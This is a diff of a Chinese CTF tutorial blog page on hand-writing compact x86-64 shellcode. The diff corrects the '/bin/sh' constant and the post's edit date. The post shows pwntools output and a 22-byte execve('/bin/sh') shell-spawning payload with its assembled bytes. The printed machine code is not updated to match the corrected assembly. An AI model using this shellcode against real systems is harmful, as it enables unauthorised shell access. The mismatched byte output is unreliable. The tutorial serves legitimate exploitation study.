@@ -42,7 +42,7 @@
 <meta property="og:description" content="Shellcode编写入门为什么要手写shellcode？现在的题目对shellcode做了越来越多的限制，比如限制长度，限制特定字符等等。所以一些通用性的shellcode已经很难再起作用，针对某个二进制文件编写特异化shellcode势在必行。">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-09-14T06:29:38.000Z">
-<meta property="article:modified_time" content="2023-09-14T06:55:03.575Z">
+<meta property="article:modified_time" content="2023-09-20T13:44:13.251Z">
 <meta property="article:author" content="hacbit">
 <meta name="twitter:card" content="summary">
 
@@ -236,10 +236,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">Posted on</span>
-              
 
-              <time title="Created: 2023-09-14 14:29:38 / Modified: 14:55:03" itemprop="dateCreated datePublished" datetime="2023-09-14T14:29:38+08:00">2023-09-14</time>
+              <time title="Created: 2023-09-14 14:29:38" itemprop="dateCreated datePublished" datetime="2023-09-14T14:29:38+08:00">2023-09-14</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-09-20 21:44:13" itemprop="dateModified" datetime="2023-09-20T21:44:13+08:00">2023-09-20</time>
+              </span>
 
           
             <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
@@ -282,7 +288,7 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcraft.sh()</span><br><span class="line">    /* execve(path=<span class="string">&#x27;/bin///sh&#x27;</span>, argv=[<span class="string">&#x27;sh&#x27;</span>], envp=<span class="number">0</span>) */</span><br><span class="line">    /* push <span class="string">b&#x27;/bin///sh\x00&#x27;</span> */</span><br><span class="line">    push <span class="number">0x68</span></span><br><span class="line">    mov rax, <span class="number">0x732f2f2f6e69622f</span></span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    /* push argument array [<span class="string">&#x27;sh\x00&#x27;</span>] */</span><br><span class="line">    /* push <span class="string">b&#x27;sh\x00&#x27;</span> */</span><br><span class="line">    push <span class="number">0x1010101</span> ^ <span class="number">0x6873</span></span><br><span class="line">    xor dword ptr [rsp], <span class="number">0x1010101</span></span><br><span class="line">    xor esi, esi /* <span class="number">0</span> */</span><br><span class="line">    push rsi /* null terminate */</span><br><span class="line">    push <span class="number">8</span></span><br><span class="line">    pop rsi</span><br><span class="line">    add rsi, rsp</span><br><span class="line">    push rsi /* <span class="string">&#x27;sh\x00&#x27;</span> */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx /* <span class="number">0</span> */</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* <span class="number">0x3b</span> */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
 
 <p>发现前面<code>push 0x68</code>， 和<code>mov rax，0x732f2f2f6e69622f</code> ,<code>push rax</code> 是把&#x2F;bin&#x2F;&#x2F;&#x2F;sh\x00push到栈上，但是如果没有对&#x2F;bin&#x2F;sh字符串做检测的话可以直接传&#x2F;bin&#x2F;sh\x00, 或者&#x2F;bin&#x2F;&#x2F;sh，所以可以简化为：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x732f6e69622f</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x68732f6e69622f</span><br></pre></td></tr></table></figure>
 
 <p><code>mov rdi, rsp</code>是把指向&#x2F;bin&#x2F;sh字符串的指针传给rdi寄存器，（因为execve的第一个参数实际上需要的是字符串的地址），由于刚刚把&#x2F;bin&#x2F;sh字符串push到栈上（此时在栈顶，也就说rsp此时指向&#x2F;bin&#x2F;sh），所以可以通过mov rdi，rsp把&#x2F;bin&#x2F;sh地址传给rdi寄存器。</p>
 <p>这里非要改的话可以改成：</p>
@@ -305,10 +311,10 @@
 <p>最后syscall，完成调用！</p>
 <p><del><strong>很好，你已经学会怎么搓shellcode了</strong></del></p>
 <p><strong>完整的汇编码：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x732f6e69622f	/* /bin/sh\x00 */</span><br><span class="line">push rax</span><br><span class="line">push rsp</span><br><span class="line">pop rdi			/* rdi -&gt; /bin/sh */</span><br><span class="line">xor esi, esi	/* rsi = 0 */</span><br><span class="line">xor edx, edx	/* rdx = 0 */</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x68732f6e69622f	/* /bin/sh\x00 */</span><br><span class="line">push rax</span><br><span class="line">push rsp</span><br><span class="line">pop rdi			/* rdi -&gt; /bin/sh */</span><br><span class="line">xor esi, esi	/* rsi = 0 */</span><br><span class="line">xor edx, edx	/* rdx = 0 */</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
 
 <p>编译成机器码看一看</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x732f6e69622f	/* /bin/sh\x00 */</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi			/* rdi -&gt; /bin/sh */</span></span><br><span class="line"><span class="string">xor esi, esi	/* rsi = 0 */</span></span><br><span class="line"><span class="string">xor edx, edx	/* rdx = 0 */</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;H\xb8/bin/s\x00\x00PT_1\xf61\xd2j;X\x0f\x05&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x68732f6e69622f	/* /bin/sh\x00 */</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi			/* rdi -&gt; /bin/sh */</span></span><br><span class="line"><span class="string">xor esi, esi	/* rsi = 0 */</span></span><br><span class="line"><span class="string">xor edx, edx	/* rdx = 0 */</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;H\xb8/bin/s\x00\x00PT_1\xf61\xd2j;X\x0f\x05&#x27;</span></span><br></pre></td></tr></table></figure>
 
 <p><strong>只有0x16（22）个字节！！！</strong></p>
 <p>再看看原来的shellcode的机器码</p>
